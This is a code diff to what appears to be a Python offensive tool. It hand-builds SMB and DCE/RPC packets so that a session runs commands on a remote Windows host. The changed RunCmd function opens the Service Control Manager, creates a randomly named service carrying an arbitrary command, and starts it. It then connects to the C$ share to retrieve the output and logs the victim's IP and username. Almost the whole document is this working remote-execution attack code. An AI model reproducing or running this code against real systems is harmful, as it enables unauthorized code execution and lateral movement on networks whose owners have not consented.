@@ -397,6 +397,56 @@ class SMBWriteData(Packet):
         self.fields["DataLenLow"] = struct.pack("<h",len(str(self.fields["Data"])))
         self.fields["Bcc"] = struct.pack("<h",len(str(self.fields["Data"])))
 
+class SMBTransDCERPC(Packet):
+    fields = OrderedDict([
+        ("Wordcount",             "\x10"),
+        ("TotalParamCount",       "\x00\x00"),
+        ("TotalDataCount",        "\x00\x00" ),
+        ("MaxParamCount",         "\x00\x00"),
+        ("MaxDataCount",          "\x00\x04"),
+        ("MaxSetupCount",         "\x00"),
+        ("Reserved",              "\x00\x00"),
+        ("Flags",                 "\x00"),
+        ("Timeout",               "\x00\x00\x00\x00"),
+        ("Reserved1",             "\x00\x00"),
+        ("ParamCount",            "\x00\x00"),
+        ("ParamOffset",           "\x00\x00"),
+        ("DataCount",             "\x00\x00"),
+        ("DataOffset",            "\x00\x00"),
+        ("SetupCount",            "\x02"),
+        ("Reserved2",             "\x00"),
+        ("OpNum",                 "\x26\x00"),
+        ("FID",                   "\x00\x00"),
+        ("Bcc",                   "\x00\x00"),
+        ("Terminator",            "\x00"),
+        ("PipeName",              "\\PIPE\\"),
+        ("PipeTerminator",        "\x00\x00"),
+        ("Data", ""),
+
+    ])
+    def calculate(self):
+        #Padding
+        if len(str(self.fields["Data"]))%2==0:
+           self.fields["PipeTerminator"] = "\x00\x00\x00\x00"
+        else:
+           self.fields["PipeTerminator"] = "\x00\x00\x00"
+        ##Convert Path to Unicode first before any Len calc.
+        self.fields["PipeName"] = self.fields["PipeName"].encode('utf-16le')
+
+        ##Data Len
+        self.fields["TotalDataCount"] = struct.pack("<h", len(str(self.fields["Data"])))
+        self.fields["DataCount"] = struct.pack("<h", len(str(self.fields["Data"])))
+
+        ##Packet len
+        FindRAPOffset = str(self.fields["Wordcount"])+str(self.fields["TotalParamCount"])+str(self.fields["TotalDataCount"])+str(self.fields["MaxParamCount"])+str(self.fields["MaxDataCount"])+str(self.fields["MaxSetupCount"])+str(self.fields["Reserved"])+str(self.fields["Flags"])+str(self.fields["Timeout"])+str(self.fields["Reserved1"])+str(self.fields["ParamCount"])+str(self.fields["ParamOffset"])+str(self.fields["DataCount"])+str(self.fields["DataOffset"])+str(self.fields["SetupCount"])+str(self.fields["Reserved2"])+str(self.fields["OpNum"])+str(self.fields["FID"])+str(self.fields["Bcc"])+str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])
+
+        self.fields["ParamOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
+        self.fields["DataOffset"] = struct.pack("<h", len(FindRAPOffset)+32)
+        ##Bcc Buff Len
+        BccComplete    = str(self.fields["Terminator"])+str(self.fields["PipeName"])+str(self.fields["PipeTerminator"])+str(self.fields["Data"])
+        self.fields["Bcc"] = struct.pack("<h", len(BccComplete))
+
+
 class SMBDCEData(Packet):
     fields = OrderedDict([
         ("Version",       "\x05"),
@@ -435,10 +485,10 @@ class SMBDCEPacketData(Packet):
         ("PacketType",    "\x00"),
         ("PacketFlag",    "\x03"),
         ("DataRepresent", "\x10\x00\x00\x00"),
-        ("FragLen",       "\x2c\x02"),
+        ("FragLen",       "\x00\x00"),
         ("AuthLen",       "\x00\x00"),
         ("CallID",        "\x00\x00\x00\x00"),
-        ("AllocHint",     "\x38\x00\x00\x00"),
+        ("AllocHint",     "\x00\x00\x00\x00"),
         ("ContextID",     "\x00\x00"),
         ("Opnum",         "\x0f\x00"),
         ("Data",          ""),
@@ -455,17 +505,19 @@ class SMBDCEPacketData(Packet):
 class SMBDCESVCCTLOpenManagerW(Packet):
     fields = OrderedDict([
         ("MachineNameRefID",     "\xb5\x97\xb9\xbc"),
-        ("MaxCount",             "\x0f\x00\x00\x00"),
+        ("MaxCount",             "\x0f\x00\x00\x00"),#need to calc.
         ("Offset",               "\x00\x00\x00\x00"),
-        ("ActualCount",          "\x0f\x00\x00\x00"),
-        ("MachineName",          "\\\\169.220.1.11"),##This is not taken into consideration.
-        ("MachineNameNull",      "\x00\x00\x00\x00"),
+        ("ActualCount",          "\x0f\x00\x00\x00"),#need to calc.
+        ("MachineName",          ""),
+        ("MachineNameNull",      "\x00\x00"),
         ("DbPointer",            "\x00\x00\x00\x00"),
         ("AccessMask",           "\x3f\x00\x0f\x00"),
     ])
 
     def calculate(self):
         ## Convert to UTF-16LE
+        self.fields["MaxCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
+        self.fields["ActualCount"] = struct.pack("<i",len(str(self.fields["MachineName"]))+1)
         self.fields["MachineName"] = self.fields["MachineName"].encode('utf-16le')
 
 class SMBDCESVCCTLCreateService(Packet):
@@ -476,7 +528,7 @@ class SMBDCESVCCTLCreateService(Packet):
         ("ActualCount",          "\x0c\x00\x00\x00"),
         ("ServiceName",          "AyAGaxwLhCP"),
         ("MachineNameNull",      "\x00\x00"),
-        ("ReferentID",           "\x9c\xfa\x9a\xc9"),
+        ("ReferentID",           "\x00\x00\x02\x00"),
         ("MaxCountRefID",        "\x11\x00\x00\x00"),
         ("OffsetID",             "\x00\x00\x00\x00"),
         ("ActualCountRefID",     "\x11\x00\x00\x00"),
@@ -493,8 +545,16 @@ class SMBDCESVCCTLCreateService(Packet):
         ("BinPathName",          ""),
         ("BinCMD",               ""),
         ("BintoEnd",             ""),
-        ("BinPathNameNull",      "\x00\x00"),
-        ("Nullz",                "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
+        ("BinCMDTerminator",     "\x00\x00"),
+        ("LoadOrderGroup",       "\x00\x00\x00\x00"),
+        ("TagID",                "\x00\x00\x00\x00"),
+        ("Dependencies",         "\x00\x00\x00\x00"),
+        ("DependenciesLen",      "\x00\x00\x00\x00"),
+        ("ServiceStartName",     "\x00\x00\x00\x00"),
+        ("Password",             "\x00\x00\x00\x00"),
+        ("PasswordLen",          "\x00\x00\x00\x00"), 
+        ("Padding",              "\x00\x00"),
+
     ])
 
     def calculate(self):
@@ -540,9 +600,9 @@ class SMBDCESVCCTLCreateService(Packet):
 class SMBDCESVCCTLOpenService(Packet):
     fields = OrderedDict([
         ("ContextHandle",        ""),
-        ("MaxCount",             "\x0c\x00\x00\x00"),
+        ("MaxCount",             "\x00\x00\x00\x00"),
         ("Offset",               "\x00\x00\x00\x00"),
-        ("ActualCount",          "\x0c\x00\x00\x00"),
+        ("ActualCount",          "\x00\x00\x00\x00"),
         ("ServiceName",          ""),
         ("MachineNameNull",      "\x00\x00"),
         ("AccessMask",           "\xff\x01\x0f\x00"),
@@ -708,7 +768,7 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
     ## DCE/RPC Read.
     if data[8:10] == "\x2f\x00":
             head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x07\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-            t = SMBReadData(FID=f)
+            t = SMBReadData(FID=f,MaxCountLow="\x00\x04", MinCount="\x00\x04",Offset="\x00\x00\x00\x00")
             t.calculate()
             packet0 = str(head)+str(t)
             buffer1 = longueur(packet0)+packet0
@@ -716,121 +776,90 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
             data = s.recv(2048)
             ## DCE/RPC SVCCTLOpenManagerW.
             if data[8:10] == "\x2e\x00":
-                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x03\x00")#, MachineName="\\\\"+Host[0])
+                head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x08\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                w = SMBDCESVCCTLOpenManagerW(MachineNameRefID="\x00\x00\x02\x00", MachineName=Host[0])
                 w.calculate()
                 x = SMBDCEPacketData(Data=w)
                 x.calculate()
-                t = SMBWriteData(FID=f,Data=x)
+                t = SMBTransDCERPC(FID=f,Data=x)
                 t.calculate()
                 packet0 = str(head)+str(t)
                 buffer1 = longueur(packet0)+packet0
                 s.send(buffer1)
                 data = s.recv(2048)
-                ## DCE/RPC Read Answer.
-                if data[8:10] == "\x2f\x00":
-                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                    t = SMBReadData(FID=f)
+
+                ##Error handling.
+                if data[8:10] == "\x2e\x00":
+                    if data[len(data)-4:] == "\x05\x00\x00\x00":
+                        print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n"
+                        return False
+
+                ## DCE/RPC Create Service.
+                if data[8:10] == "\x25\x00":
+                    ContextHandler = data[84:104]
+                    ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
+                    ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
+                    FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
+                    FilePath = FileChars
+                    head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x09\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                    w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler, ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars, FileName=FilePath,BinCMD=Command)
+                    w.calculate()
+                    x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
+                    x.calculate()
+                    t = SMBTransDCERPC(FID=f,Data=x)
                     t.calculate()
                     packet0 = str(head)+str(t)
                     buffer1 = longueur(packet0)+packet0
                     s.send(buffer1)
                     data = s.recv(2048)
-                    ## DCE/RPC SVCCTLCreateService.
-                    if data[8:10] == "\x2e\xb0":
-                       print "[+] Server returned NT_STATUS_PIPE_DISCONNECTED, no admin rights on that pipe.\n"
-                       return False
-                    ## DCE/RPC SVCCTLCreateService.
-                    if data[8:10] == "\x2e\x00":
+                    #print "[+] Creating service"
+
+                    ## DCE/RPC SVCCTLOpenService.
+                    if data[8:10] == "\x25\x00":
                         if data[len(data)-4:] == "\x05\x00\x00\x00":
-                            print "[+] Failed to open SVCCTL Service Manager, is that user a local admin on this host?\n"
+                            print "[+] Failed to create the service\n"
                             return False
-                        #print "[+] Creating service"
-                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                        ContextHandler = data[88:108]
-                        ServiceNameChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(11)])
-                        ServiceIDChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(16)])
-                        FileChars = ''.join([random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6)])+'.bat'
-                        FilePath = FileChars
-                        w = SMBDCESVCCTLCreateService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars,DisplayNameID=ServiceIDChars, FileName=FilePath, ReferentID="\x21\x03\x03\x00",BinCMD=Command)
+                        #print "[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars)
+                        head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0a\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                        w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
                         w.calculate()
-                        x = SMBDCEPacketData(Opnum="\x0c\x00",Data=w)
+                        x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
                         x.calculate()
-                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
+                        t = SMBTransDCERPC(FID=f,Data=x)
                         t.calculate()
                         packet0 = str(head)+str(t)
                         buffer1 = longueur(packet0)+packet0
                         s.send(buffer1)
                         data = s.recv(2048)
-                        ## DCE/RPC Read Answer.
-                        if data[8:10] == "\x2f\x00":
-                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
+
+                        ## DCE/RPC SVCCTLStartService.
+                        if data[8:10] == "\x25\x00":
+                            if data[len(data)-4:] == "\x05\x00\x00\x00":
+                                print "[+] Failed to open the service.\n"
+                                return False
+                            ContextHandler = data[84:104]
+                            head = SMBHeader(cmd="\x25",flag1="\x18", flag2="\x07\xc8",mid="\x0b\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
+                            w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
+                            x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
+                            x.calculate()
+                            t = SMBTransDCERPC(FID=f,Data=x)
                             t.calculate()
                             packet0 = str(head)+str(t)
                             buffer1 = longueur(packet0)+packet0
                             s.send(buffer1)
                             data = s.recv(2048)
-                            ## DCE/RPC SVCCTLOpenService.
-                            if data[8:10] == "\x2e\x00":
-                                if data[len(data)-4:] == "\x05\x00\x00\x00":
-                                    print "[+] Failed to create the service\n"
-                                    return False
-                                #print "[+] Service name: %s with display name: %s successfully created"%(ServiceNameChars, ServiceIDChars)
-                                head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0c\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                                w = SMBDCESVCCTLOpenService(ContextHandle=ContextHandler,ServiceName=ServiceNameChars)
-                                w.calculate()
-                                x = SMBDCEPacketData(Opnum="\x10\x00",Data=w)
-                                x.calculate()
-                                t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
-                                t.calculate()
-                                packet0 = str(head)+str(t)
-                                buffer1 = longueur(packet0)+packet0
-                                s.send(buffer1)
-                                data = s.recv(2048)
-                                ## DCE/RPC Read Answer.
-                                if data[8:10] == "\x2f\x00":
-                                    head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0d\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                                    t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
-                                    t.calculate()
-                                    packet0 = str(head)+str(t)
-                                    buffer1 = longueur(packet0)+packet0
-                                    s.send(buffer1)
-                                    data = s.recv(2048)
-                                    ## DCE/RPC SVCCTLStartService.
-                                    if data[8:10] == "\x2e\x00":
-                                        if data[len(data)-4:] == "\x05\x00\x00\x00":
-                                            print "[+] Failed to open the service.\n"
-                                            return False
-                                        ContextHandler = data[88:108]
-                                        head = SMBHeader(cmd="\x2f",flag1="\x18", flag2="\x05\x28",mid="\x0e\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                                        w = SMBDCESVCCTLStartService(ContextHandle=ContextHandler)
-                                        x = SMBDCEPacketData(Opnum="\x13\x00",Data=w)
-                                        x.calculate()
-                                        t = SMBWriteData(Offset="\x9f\x01\x00\x00",FID=f,Data=x)
-                                        t.calculate()
-                                        packet0 = str(head)+str(t)
-                                        buffer1 = longueur(packet0)+packet0
-                                        s.send(buffer1)
-                                        data = s.recv(2048)
-                                        ## DCE/RPC Read Answer.
-                                        if data[8:10] == "\x2f\x00":
-                                            head = SMBHeader(cmd="\x2e",flag1="\x18", flag2="\x05\x28",mid="\x0f\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
-                                            t = SMBReadData(FID=f,MaxCountLow="\x40\x02", MinCount="\x40\x02",Offset="\x82\x02\x00\x00")
-                                            t.calculate()
-                                            packet0 = str(head)+str(t)
-                                            buffer1 = longueur(packet0)+packet0
-                                            s.send(buffer1)
-                                            data = s.recv(2048)
-
 
     ##Tree connect c$
-    if data[8:10] == "\x2e\x00":
+    if data[8:10] == "\x25\x00":
+
+       if data[len(data)-4:] == "\x05\x00\x00\x00":
+           print "[+] Failed to start the service.\n"
+           return False
+
        #print "[+] Command executed, grabbing output now."
        Logs.info('Command executed:')
        Logs.info(clientIP+","+Username+','+Command)
-       #time.sleep(1)#Maybe the command executed took some time..
-       #print "[+] Removing service.\n[+] Cleaning up files.\n"
+       #print "[+] Removing service.\n[+] Cleaning up output file.\n"
        head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x10\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
        t = SMBTreeConnectData(Path="\\\\"+Host[0]+"\\C$")
        t.calculate()
@@ -862,6 +891,7 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
              time.sleep(1)#not found, command failed.
              print "[+] The command failed."
              return data
+
     ##ReadRequest.
     ## Need grab the size from Open And X and do it properly later. For now, only 65535 bytes printed.
     if data[8:10] == "\x2d\x00":
@@ -905,4 +935,5 @@ def RunCmd(data, s, clientIP, Username, Domain, Command, Logs, Host):
        s.send(buffer1)
        data = s.recv(2048)
        return data
+
 
